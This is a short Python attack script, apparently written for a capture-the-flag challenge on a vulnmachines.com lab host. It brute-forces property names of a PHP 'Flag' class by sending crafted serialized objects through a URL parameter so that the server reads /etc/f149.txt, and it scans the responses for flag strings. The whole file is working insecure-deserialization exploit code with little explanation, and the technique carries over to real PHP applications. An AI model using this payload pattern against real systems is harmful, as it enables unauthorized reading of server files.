#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://hackme11.vulnmachines.com:8056"

# Posibles nombres de propiedades para la clase Flag
properties = [
    "file", "filename", "path", "filepath", 
    "name", "target", "source", "location",
    "flag", "content", "data", "text",
    "f", "fn", "fname", "file_name",
    "_file", "_filename", "_path",
    "flagfile", "flag_file", "flagFile",
    "readfile", "read_file", "readFile",
    "input", "in", "src", "from"
]

print("[*] Bruteforcing Flag class properties...")

for prop in properties:
    # Crear payload con la propiedad
    payload = f'O:4:"Flag":1:{{s:{len(prop)}:"{prop}";s:13:"/etc/f149.txt";}}'
    
    print(f"\n[*] Testing property: {prop}")
    print(f"    Payload: {payload}")
    
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    try:
        response = requests.get(url, timeout=5)
        
        # Buscar la flag
        flag_patterns = [
            r'vulnmachines{[^}]+}',
            r'flag{[^}]+}',
            r'FLAG{[^}]+}',
            r'vm{[^}]+}',
            r'VM{[^}]+}',
            r'[a-fA-F0-9]{32}',
            r'[a-fA-F0-9]{40}',
        ]
        
        for pattern in flag_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                print(f"[!!!] FLAG FOUND: {matches[0]}")
                print(f"[!!!] Working property: {prop}")
                exit(0)
        
        # Comparar con respuesta normal
        normal = requests.get(f"{base_url}/params?vnm=").text
        
        if len(response.text) != len(normal):
            print(f"    [!] Response length different: {len(response.text)} vs {len(normal)}")
            
        # Buscar errores específicos
        if "Notice" in response.text or "Warning" in response.text:
            for line in response.text.split('\n'):
                if "Notice" in line or "Warning" in line:
                    if "unserialize" not in line:  # Ignorar errores de unserialize
                        print(f"    [!] Error: {line.strip()[:100]}")
                        
    except Exception as e:
        print(f"    [-] Request failed: {e}")

print("\n[-] No flag found with Flag class")